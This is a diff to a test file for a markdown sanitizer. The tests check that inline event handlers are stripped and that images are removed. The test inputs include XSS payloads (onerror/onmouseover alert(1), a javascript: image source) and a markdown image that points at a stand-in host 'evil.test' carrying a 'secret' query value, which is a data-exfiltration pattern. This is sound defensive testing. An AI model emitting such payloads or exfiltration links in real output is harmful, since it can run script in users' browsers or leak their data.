@@ -71,12 +71,19 @@ describe('sanitization', () => {
   })
 
   it('strips inline event handlers while keeping the element', () => {
-    const wrapper = mountMarkdown('<img src="x" onerror="alert(1)" alt="x">')
-    const image = wrapper.find('img')
+    const wrapper = mountMarkdown('<em onmouseover="alert(1)">x</em>')
+    const emphasis = wrapper.find('em')
 
-    expect(image.exists()).toBe(true)
-    expect(image.attributes('onerror')).toBeUndefined()
-    expect(wrapper.html()).not.toContain('onerror')
+    expect(emphasis.exists()).toBe(true)
+    expect(emphasis.attributes('onmouseover')).toBeUndefined()
+    expect(wrapper.html()).not.toContain('onmouseover')
+  })
+
+  it('removes images, which would load without a click', () => {
+    const wrapper = mountMarkdown('Done ![](https://evil.test/c?d=secret)')
+
+    expect(wrapper.find('img').exists()).toBe(false)
+    expect(wrapper.html()).not.toContain('evil.test')
   })
 
   it('strips an onclick handler from a link', () => {
@@ -96,12 +103,6 @@ describe('sanitization', () => {
 
     expect(wrapper.find('a').attributes('href')).toBeUndefined()
     expect(wrapper.html()).not.toContain('javascript:')
-  })
-
-  it('drops a javascript: image source', () => {
-    const wrapper = mountMarkdown('<img src="javascript:alert(1)">')
-
-    expect(wrapper.find('img').attributes('src')).toBeUndefined()
   })
 
   it('strips an iframe', () => {
